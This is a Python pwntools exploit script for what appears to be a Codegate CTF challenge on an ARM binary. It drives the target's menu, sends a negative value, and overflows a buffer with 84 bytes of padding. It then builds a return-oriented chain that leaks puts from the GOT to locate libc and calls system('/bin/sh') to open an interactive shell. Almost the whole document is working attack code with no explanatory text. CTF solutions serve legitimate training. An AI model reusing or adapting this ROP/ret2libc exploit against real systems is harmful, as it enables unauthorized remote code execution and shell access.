from pwn import *

local=0
atta=0
uselibc=0  #0 for no,1 for i386,2 for x64
haslibc=1
pc=''
remote_addr="ch41l3ng3s.codegate.kr"
remote_port=1199

if uselibc==2 and haslibc==0:
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elif uselibc==1 and haslibc==0:
    libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
if haslibc!=0:
    libc=ELF('./libc.so.6')

p=remote(remote_addr,remote_port)
if haslibc!=0:
    libc=ELF('/usr/arm-linux-gnueabi/lib/libc.so.6')

if local:
    context.log_level=True
    if atta:
        gdb.attach(p)
        #gdb.attach(p,open('debug'))

def ru(a):
    return p.recvuntil(a)

def sn(a):
    p.send(a) 

def rl():
    return p.recvline()

def sl(a):
    p.sendline(a)

def rv(a):
    return p.recv(a)

def raddr(a,l=None):
    if l is None:
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
    print('\033[1;31;40m')
    print("%20s-->0x%x"%(s,addr))
    print('\033[0m')

def sa(a,b):
    p.sendafter(a,b)

def sla(a,b):
    p.sendlineafter(a,b)

def choice(index):
    sla('Type the number:',str(index))

def go(payload):
    choice(1)
    sla('Your height(meters) : ','1')
    sla('Your weight(kilograms) : ','1')
    choice(3)
    sla('take personal training?\n','-1')
    choice(4)
    sl(payload)
    choice(6)
    rl()

def leak(address):
    main=0x110CC
    pop_r0=0x00011bbc
    puts_plt=0x0104A8
    puts_got=0x2301c
    payload='A'*84+p32(pop_r0)+p32(address)+p32(puts_plt)
    payload+=p32(main)*8
    go(payload)
    return p.recv(4)

def hack():
    pop_r0=0x00011bbc
    main=0x110CC
    puts_plt=0x0104A8
    puts_got=0x2301c
    payload='A'*84+p32(pop_r0)+p32(puts_got)+p32(puts_plt)
    payload+=p32(main)*8
    go(payload)
    libc.address=u32(p.recv(4))-libc.symbols['puts']
    lg("LIBc",libc.address)
    payload='A'*84+p32(pop_r0)+p32(libc.search('/bin/sh').next())+p32(libc.symbols['system'])
    go(payload)
    p.interactive()

hack()
